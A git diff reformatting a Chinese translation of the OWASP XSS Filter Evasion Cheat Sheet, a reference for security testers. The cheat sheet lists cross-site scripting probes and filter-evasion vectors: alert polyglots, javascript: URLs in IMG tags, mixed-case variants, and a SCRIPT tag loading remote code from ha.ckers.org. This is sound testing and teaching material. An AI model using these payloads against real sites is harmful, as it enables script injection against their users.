@@ -1,7 +1,9 @@
-XSS Filter Evasion Cheat Sheet 中文版
-==================================
+# XSS Filter Evasion Cheat Sheet 中文版
 
-译者注：
+本文是`XSS`相关的知识笔记。
+
+## 译者注
+
 翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常的价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅是简单的把文中的各种代码复制下来，然后看起来很刁的发在各种论坛上，不过你要真去认真研读这些代码，就会完全不知所云了。原因是这篇文章最精华的部分是代码的解释而非代码本身。
 
 一方面为了自己学习，一方面也想让更多国内的xss爱好者去更方便的阅读本文。所以虽然我本身英语很烂，xss技术也很烂，但还是去翻译了这篇文章。当然这也导致最后翻译出来的文章晦涩难懂、不知所云。这个真心向大家说声抱歉啊，也希望大家能及时帮忙提出文中的翻译错误或其他错误。
@@ -16,52 +18,51 @@ XSS Filter Evasion Cheat Sheet 中文版
 
 翻译文档github地址：https://github.com/caomulaodao/XSS-Filter-Evasion-Cheat-Sheet-CN
 
-#介绍#
+## 介绍
+
 这篇文章的主要目的是去给应用安全测试者提供一份xss漏洞检测指南。文章的初始内容由RSnake提供给OWASP，从他的xss备忘录: http://ha.ckers.org/xss.html 。目前这个网页已经重定向到我们这里，我们打算维护和完善它。OWASP的第一个防御备忘录项目：the XSS (Cross Site Scripting) Prevention Cheat Sheet灵感来源于RSnake的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者去帮助他们预防xss漏洞，而不是创建一个复杂的备忘录去简单的告诉他们需要去预防各种千奇百怪的攻击。所以，OWASP备忘录系列诞生了。
 
-------
-#测试#
+## 测试
+
 这个备忘录主要针对那些已经理解了最基本的xss攻击，但是想要深入理解各种过滤器绕过的细微差别的学习者。
 
 请注意大部分的xss攻击向量已经在其代码下方给出了测试过的浏览器列表。
 
------
-##xss 探测器##
+## xss 探测器
+
 注入下面这些代码，在大多数没有特殊xss向量要求而易遭受脚本攻击的地方将会弹出单词“xss”。使用[url编码器][1]去编码你的整个代码。小技巧：如果你是急切的需要快去检测一个页面，通常只需要注入轻量的 "<任意字符>" 标签，然后判断输出点是否受到干扰就可以判断是否xss漏洞了。
 
-    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
-    alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
-    ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+```bash
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+```
 
--------
+## xss 探测器2
 
-##xss 探测器2##
 如果你没有充足的输入空间去检测页面是否存在xss漏洞。下面这段代码是一个好的简洁的xss注入检测代码。在注入这段代码后，查看页面源代码寻找是否存在看起来像 <XSS verses &lt;XSS这样的输出点从而判断是否存在xss漏洞。
 
     '';!--"<XSS>=&{()}
 
 ---------
 
-##无过滤绕过##
+## 无过滤绕过
+
 这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）
 
     <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 
--------
-
--------
-##通过javascript指令实现的图片xss##
+## 通过javascript指令实现的图片xss
 
 图片xss依靠javascript指令实现。（IE7.0不支持javascript指令在图片上下文中，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理。）
 
     <IMG SRC="javascript:alert('XSS');">
 
------
-##无引号无分号##
+## 无引号无分号
 
     <IMG SRC=javascript:alert('XSS')>
 
------
+
 ##不区分大小写的xss攻击向量##
 
     <IMG SRC=JaVaScRiPt:alert('XSS')>
